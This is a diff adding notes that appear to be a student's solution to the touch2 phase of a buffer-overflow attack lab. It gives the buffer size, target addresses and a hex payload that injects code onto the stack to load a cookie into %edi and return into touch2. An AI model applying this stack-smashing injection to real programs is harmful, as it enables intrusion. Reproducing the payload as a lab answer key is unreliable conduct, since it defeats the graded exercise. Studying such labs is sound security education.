@@ -1,0 +1,12 @@
+BUFSIZE = 0x38
+touch2 at 0x401ceb
+rsp0 = 55671660
+5567 1649
+
+--- PAD ---
+78 16 67 55 00 00 00 00 # <- rsp0 + 24 == rsp0 + 0x18
+00 00 00 00 00 00 00 00 # rsp pad
+eb 1c 40 00 00 00 00 00 # <- rsp1
+48 83 c4 08             # add $0x8,%rsp
+bf a5 8f 6f 1d          # mov $0x1d6f8fa5, %edi
+c3 # ret
